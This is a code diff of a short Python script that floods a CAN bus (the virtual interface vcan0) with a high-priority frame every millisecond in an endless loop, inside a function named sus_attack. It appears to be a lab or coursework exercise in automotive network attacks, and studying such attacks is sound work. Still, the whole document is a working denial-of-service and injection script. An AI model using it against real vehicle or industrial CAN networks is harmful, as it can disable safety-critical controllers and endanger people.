@@ -1,23 +1,25 @@
 import can 
 import time 
 
+CAN_INTERFACE = "vcan0"  
+ID = 0x100 #higher priority ID
+
 bus = can.interface.Bus(channel="vcan0", bustype="socketcan")
 
-def sus_message():
-
-    
-    id = 0x100 # mettere gli id giusti per ogni tipo di comando
+def sus_attack(bus):
     data = [0x7f, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ]
+    msg = can.Message(arbitration_id = ID, data = data, is_extended_id = False)
 
-    return can.Message(arbitration_id = id, data = data, is_extended_id = False)
+    try:
+        while True:
+            bus.send(msg)
+            print(f"sus msg: {msg}")
+            time.sleep(0.001)
+    except KeyboardInterrupt:
+        print("Interruption of messages by keyboard")
+    except can.CanError as e:
+        print(f"CAN error: {e}")
 
-try:
-    while True:
-        msg = sus_message()
-        bus.send(msg)
-        print(f"sus msg: {msg}")
-        time.sleep(0.001)
-except KeyboardInterrupt:
-    print("Stacca Stacca")
-except can.CanError as e:
-    print(f"CAN error: {e}")
+if __name__ == "__main__":
+    with can.interface.Bus(channel=CAN_INTERFACE, bustype="socketcan") as bus:
+        sus_attack(bus)
